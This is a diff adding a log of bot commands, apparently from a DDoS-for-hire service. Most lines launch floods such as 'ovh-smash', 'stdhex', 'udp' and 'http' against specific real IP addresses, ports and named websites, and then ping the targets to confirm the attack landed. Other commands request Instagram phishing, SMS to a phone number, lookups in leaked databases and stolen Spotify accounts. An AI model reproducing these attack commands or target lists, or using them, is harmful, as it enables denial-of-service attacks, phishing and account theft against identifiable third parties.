@@ -1,0 +1,300 @@
+/plans
+/sms
+/sms +447517663929
+/sms phone +447517663929
+/methods
+/ddos
+/plan
+/ping 45.146.252.9
+/ping 107.141.184.203
+/helo
+/accounts
+/spotify
+/
+/lag
+/hitlist
+/bugbounty
+/info
+/dbshow
+/dbshow https//habbo.com
+/dbsearch
+/dbshow 1
+/phisoptions
+/pishoptions
+/pishoptions
+/phis
+/phisoptions
+/phishoptions
+/phish Instagram
+/method
+/methods
+/ddos http http://23.237.42.18/hit 30
+/ddos http http://23.237.42.18/hit 30
+/ping 185.249.196.78
+/ping 185.249.196.78
+/ping 71.207.139.22
+/ping 209.126.127.176
+/ping 209.126.127.176
+/ping 209.126.127.176
+/ping 209.126.127.175
+/ping 209.126.127.176
+/ddos ovh-smash 209.126.127.176 30120 120
+/ddos ovh-smash 209.126.127.176 100 30120
+/pin/ping 209.126.127.176
+/ping 209.126.127.176
+/ping 209.126.127.176
+/ping 185.249.196.78
+/ping 209.126.127.176
+/ddos stdhex 103.95.221.2 80 60
+/if u want xD
+/ddos stdhex 103.95.221.2 80 60
+/ddos ovh-smash 51.222.10.58 dport 52779 120
+/ddos ovh-smash 51.222.10.58 120 52779
+/ip 51.222.10.58
+/ddos ovh-smash 51.222.10.58 120 30169
+/ping 51.222.10.58
+/ping 51.222.10.58
+/accounts
+/Spotify
+/ping 51.222.10.58
+/ping 51.222.10.58
+/ddos ovh-smash 45.146.252.9 120 30154
+/ping 45.146.252.9
+/ping 45.146.252.9
+/ping 45.146.252.9
+/ddos ovh-smash 193.70.7.60 120 37995
+/ddos ovh-smash 193.70.7.60 120 37995
+/ping 193.70.7.60
+/ping 193.70.7.60
+/ping 193.70.7.60
+/ping 193.70.7.60
+/ping 193.70.7.60
+/checkip 193.70.7.60
+/ping 31.214.243.53
+/checkip 31.214.243.53
+/ping 31.214.243.53:30120
+/ping 31.214.243.53
+/ping 31.214.243.53:30120
+/ddos ovh-smash 31.214.243.53 120 30120
+/ping 31.214.243.53:30120
+/ping 31.214.243.53:3011234282
+/ping 31.214.243.53
+/ping 31.214.243.53
+/ping 45.146.252.9
+/ping 185.249.196.166
+/ddos nfo-down 185.249.196.166 120 30120
+/ping 185.249.196.166
+/ping 185.249.196.166
+/ping 185.249.196.166
+/ddos ovh-smash 185.249.196.166 120
+/ping 185.249.196.166
+/ping 185.249.196.166
+/checkip 185.249.196.166
+/ddos ovh-smash 185.249.196.166 120 30120
+/ping 185.249.196.166
+/methods
+/ddos http https://www.instant-gaming.com conns=5000
+/ping 51.38.21.137
+/ping 51.38.21.137
+/ping 51.38.21.137
+/heal bots
+/ping 52.180.99.11
+/checkip 52.180.99.11
+/methods
+/ddos stdhex 52.146.49.226 120 30202
+/ping 52.146.49.226
+/ping 52.180.99.11
+/ping 52.146.49.226
+/ddos udp 52.146.49.226 120 30202
+/ping 52.146.49.226
+/ping 52.146.49.226
+/ping 185.249.196.77
+/ddos udp 185.249.196.77 120 dport=61321
+/ddos ovh-smash 193.70.7.60 120 37995
+/tr4p
+/ddos
+/plan
+/ddos ovh-smash 193.70.7.60 120 37995
+/ping 193.70.7.60 120
+/ping 193.70.7.60 120
+/ping 193.70.7.60 120
+/ping 193.70.7.60 120
+/ping 193.70.7.60
+/ddos ovh-smash 193.70.7.60 120 37995
+/methods
+/ddos stdhex 193.70.7.60 120 37995
+/ping 193.70.7.60
+/ddos ovh-smash 193.70.7.60 120 37995
+/checkip 193.70.7.60
+/ping 193.70.7.60
+/ping 193.70.7.60
+/plan
+/bots
+/methods
+/ddos http 151.101.134.133 60 domain=ccma.cat conns=5000
+/ping https://www.ccma.cat/
+/ping www.ccma.cat
+/ping 192.99.110.146
+/checkip 45.84.196.135
+/checkip 193.23.126.124
+/ping 193.23.126.124
+/ping 193.23.126.124
+/ping 193.23.126.124
+/ping 193.23.126.124
+/ddos ovh-smash 193.23.126.124 120 30120
+/ping 193.23.126.124
+/ping 193.23.126.124
+/ping 193.23.126.124
+/ddos ovh-smash 193.23.126.124 120 30120
+/ping 193.23.126.124
+/ddos ovh-smash 193.23.126.124 120 30120
+/ping 193.23.126.124
+/ping 45.146.252.9
+/ddos ovh-smash 45.146.252.9 120 30120
+/ping 45.146.252.9
+/ping 45.146.252.9
+/ddos ovh-smash 45.146.252.9 120 30154
+/ddos ovh-smash 104.27.179.207 120 80
+/ddos ovh-smash 104.27.179.207 120 30120
+/ddos ovh-smash 51.210.121.135 60 dport=30120
+/ping 51.210.121.135
+/ping 51.210.121.135
+/ping 45.146.252.9
+/methods
+/ddos stdhex 45.146.252.9 120 30154
+/ping 45.146.252.9
+/ping 45.146.252.9
+/ddos ovh-smash 104.248.137.199 5 30120
+/spotify
+/spotify
+/spotify
+/spotify
+/spotify
+/spotify
+/spotify
+/spotify
+/spotify
+/spotify
+/spotify
+/spotify
+/spotify
+/spotify
+/spotify
+/spotify
+/spotify
+/methods
+/ddos stdhex 128.116.46.161 120 52330
+/ddos stdhex 128.116.122.3 60 443
+/checkip 128.116.122.3
+/methods
+/ddos stdhex 92.191.241.158 15 80
+/checkip 30123
+/checkip 5m.despistaos.es
+/ping 5m.despistaos.es
+/ping 137.74.153.10
+/ddos ovh-smash 137.74.153.10 120 30123
+/ddos ovh-smash 185.223.29.226 120 30120
+/ping 185.223.29.226
+/checkip 51.210.121.135
+/ddos ovh-smash 51.210.121.135 35 30120
+/ping 51.210.121.135
+/ping 51.210.121.135
+/ddos ovh-smash 51.210.121.135 35 30120
+/ddos ovh-smash 51.210.121.135 35 30120
+/ddos ovh-smash 51.210.121.135 35 30120
+/ping 51.210.121.135
+/stop
+/hitlist
+/ddos ovh-smash 193.70.7.60 120 37995
+/ddos ovh-smash 193.70.7.60 120 37995
+/ping 193.70.7.60
+/ddos stdhex 193.70.7.60 120 37995
+/ping 193.70.7.60
+/ping 193.70.7.60
+/ping 193.70.7.60
+/ping 193.70.7.60
+/ping 193.70.7.60
+/ddos ovh-smash 193.70.7.60 30 37995
+/checkip https://www.instant-gaming.com/es/
+/checkip instant-gaming.com
+/ddos ovh-smash 193.70.7.60 120 37995
+/ping 193.70.7.60
+/ddos ovh-smash 193.70.7.60 40 37995
+/ping 193.70.7.60
+/ddos stdhex 103.95.221.2 45 80
+/ddos ovh-smash 193.70.7.60 40 37995
+/ping 193.70.7.60
+/methods
+/plan
+/checkip 149.202.89.162
+/ddos ovh-smash 149.202.89.162 80 30120
+/ping 149.202.89.162
+/ddos ovh-smash 149.202.89.162 15 30120
+/ping 149.202.89.162
+/ping 149.202.89.162
+/ping 149.202.89.162
+/ping 149.202.89.162
+/ping 74.50.247.210
+/methods
+/ddos http 188.165.2.114 45 domain=188.165.2.114 conns=5000
+/ddos ovh-smash 185.223.29.226 120 30120
+/ping 185.223.29.226
+/ping 185.223.29.226
+/ping 185.223.29.226
+/ping 185.223.29.226
+/ping 185.223.29.226
+/ping 185.223.29.226
+/ping 185.223.29.226
+/checkip 104.22.47.177
+/checkip 185.223.29.226
+/ping 185.223.29.226
+/ddos ovh-smash 185.223.29.226 120 30120
+/ddos ovh-smash 185.223.29.226 120 3306
+/ddos ovh-smash 161.97.72.214 35 30120
+/ping 161.97.72.214
+/methods
+/ddos 46.251.180.220 stdhex 60 80
+/ddos stdhex 46.251.180.220 60 80
+/ping 46.251.180.220
+/checkip /ping 46.251.180.220
+/ping 46.251.180.220
+/ddos stdhex 46.251.180.220 60 80
+/ddos stdhex 46.251.180.220 320 80
+/ddos stdhex 46.251.180.220 120 80
+/ddos stdhex 46.251.180.220 12 80
+/ddos stdhex 46.251.180.220 20 80
+/ping 46.251.180.220
+/ddos ovh-smash 185.223.29.226 60 80
+/ddos stdhex 85.52.163.173 120 80
+/checkip 51.161.33.137
+/ddos ovh-smash 51.161.33.137 60 30120
+/ping 51.161.33.137
+/ping 51.161.33.137
+/ping 51.161.33.137
+/ping 51.161.33.137
+/ddos ovh-smash 51.161.33.137 120 30120
+/ddos stdhex 51.161.33.137 60 30120
+/ddos ovh-smash 51.161.33.137 120 30120
+/ddos ovh-smash 51.161.33.137 120 30120
+/ddos ovh-smash 51.161.33.137 120 30120
+/ddos stdhex 2.152.40.39 20 80
+/ddos ovh-smash 161.97.72.214 55 30120
+/ddos ovh-smash 161.97.72.214 120 30120
+/ddos ovh-smash 161.97.72.214 80 30120
+/ddos stdhex 161.97.72.214 45 30120
+/ddos stdhex 161.97.72.214 120 30120
+/ddos stdhex 161.97.72.214 120 30120
+/ddos stdhex 161.97.72.214 120 30120
+/ddos stdhex 161.97.72.214 120 30120
+/ddos stdhex 161.97.72.214 120 30120
+/ddos stdhex 161.97.72.214 120 30120
+/ddos stdhex 161.97.72.214 120 30120
+/ddos stdhex 161.97.72.214 120 30120
+/ddos stdhex 161.97.72.214 120 30120
+/ddos ovh-smash 54.37.76.96 30120 45
+/ping 51.161.33.137
+/ddos ovh-smash 54.39.66.130 60 9700
+/ping 54.39.66.130
+/ping 54.39.66.130
+/plan
+/methods
